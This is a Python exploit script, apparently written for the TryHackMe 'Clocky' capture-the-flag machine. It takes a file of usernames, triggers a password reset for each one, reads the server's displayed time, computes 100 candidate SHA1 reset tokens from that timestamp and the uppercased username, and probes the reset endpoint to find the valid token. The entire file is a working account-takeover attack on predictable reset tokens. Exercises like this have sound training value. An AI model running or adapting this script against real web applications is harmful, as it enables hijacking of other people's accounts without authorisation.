#This script was used for Clocky machine in TryHackMe
import sys
import datetime
import hashlib
import requests
import re

def read_file(filename):
    try:
        with open(filename, 'r') as file:
            content =  [line.strip() for line in file.readlines()]
            return content
    except FileNotFoundError:
        print('File \'{}\' not found.'.format(filename))
        
def reset_password(url, data):
    try:
        response = requests.post(url+'/forgot_password', data=data)
        time_response = requests.get(url)
        if response.status_code == 200:
            print('Password reset successful!')
            
            if time_response.status_code == 200:
                time_pattern = r'The current time is (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'
                match = re.search(time_pattern, time_response.text)
                if match:
                    current_time = match.group(1)
                    print('Current time:', current_time)
                    return current_time
    except Exception as e:
        print('An error occurred: {}'.format(str(e)))

def calc_tokens(username, timestamp):
    tokens = []
    for i in range(100):
        lnk = timestamp + '.' + format(i, '02') + ' . ' + username.upper()
        hashvalue = hashlib.sha1(lnk.encode('utf-8'))
        #print(lnk + ' : ' + hashvalue.hexdigest())
        tokens.append(hashvalue.hexdigest())
    return tokens

def try_tokens(url, tokens):
    for token in tokens:
        token_url = url+'password_reset?token=' + token
        response = requests.get(token_url)
        if '<h2>Invalid token</h2>' not in response.text:
            print('Valid token: {}'.format(token))


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python reset.py <filename>')
    else:
        filename = sys.argv[1]
        base_url = 'http://clocky.thm:8080/'

        for user in read_file(filename):
            print(user)
            data = {
               'username': user
            }
            timestamp = reset_password(base_url, data)
            try_tokens(base_url, calc_tokens(user, timestamp))
            print('---------------------------------------------------------')
